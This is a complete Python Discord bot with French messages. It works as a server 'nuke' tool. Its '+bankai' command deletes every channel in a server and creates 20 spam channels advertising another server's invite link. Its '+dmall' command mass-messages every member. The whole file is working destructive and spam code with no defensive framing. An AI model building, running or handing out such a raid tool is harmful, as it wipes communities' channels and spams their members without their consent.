import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="+", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot connecté en tant que {bot.user}")
    print(f"🎮 Bot prêt!")

@bot.command(name="dmall")
@commands.has_permissions(administrator=True)
async def dmall(ctx, *, message):
    guild = ctx.guild
    members = guild.members
    
    embed = discord.Embed(
        title="📨 Envoi en cours...",
        description=f"Message à {len(members)} membre(s)",
        color=discord.Color.blue()
    )
    confirmation = await ctx.send(embed=embed)
    
    sent = 0
    failed = 0
    
    for member in members:
        if member.bot:
            continue
        
        try:
            embed_msg = discord.Embed(
                title=f"Message de {ctx.author.name}",
                description=message,
                color=discord.Color.green()
            )
            embed_msg.set_footer(text=f"Serveur: {guild.name}")
            await member.send(embed=embed_msg)
            sent += 1
        except:
            failed += 1
        
        await asyncio.sleep(0.5)
    
    result_embed = discord.Embed(
        title="✅ Terminé",
        description=f"✔️ Envoyés: **{sent}**\n❌ Échoués: **{failed}**",
        color=discord.Color.green()
    )
    await confirmation.edit(embed=result_embed)

@bot.command(name="bankai")
@commands.has_permissions(administrator=True)
async def bankai(ctx):
    guild = ctx.guild
    
    embed = discord.Embed(
        title="⚠️ BANKAI ACTIVÉ",
        description="Suppression en cours...",
        color=discord.Color.red()
    )
    msg = await ctx.send(embed=embed)
    
    deleted_count = 0
    for channel in guild.channels.copy():
        try:
            await channel.delete()
            deleted_count += 1
        except:
            pass
    
    message_contenu = "REJOIGNEZ KAYO https://discord.gg/8CzScNmFnr"
    created_count = 0
    
    for i in range(20):
        try:
            new_channel = await guild.create_text_channel(name="KAYO KAYO")
            embed_kayo = discord.Embed(
                title="🎌 KAYO KAYO 🎌",
                description=message_contenu,
                color=discord.Color.gold()
            )
            await new_channel.send(embed=embed_kayo)
            created_count += 1
        except:
            pass
        
        await asyncio.sleep(0.3)
    
    result_embed = discord.Embed(
        title="🌟 BANKAI COMPLÉTÉ 🌟",
        description=f"🗑️ Supprimés: **{deleted_count}**\n✨ Créés: **{created_count}**",
        color=discord.Color.gold()
    )
    await msg.edit(embed=result_embed)

@dmall.error
@bankai.error
async def command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="❌ Permission refusée",
            description="Admin uniquement",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

TOKEN = os.getenv('DISCORD_TOKEN')
bot.run(TOKEN)
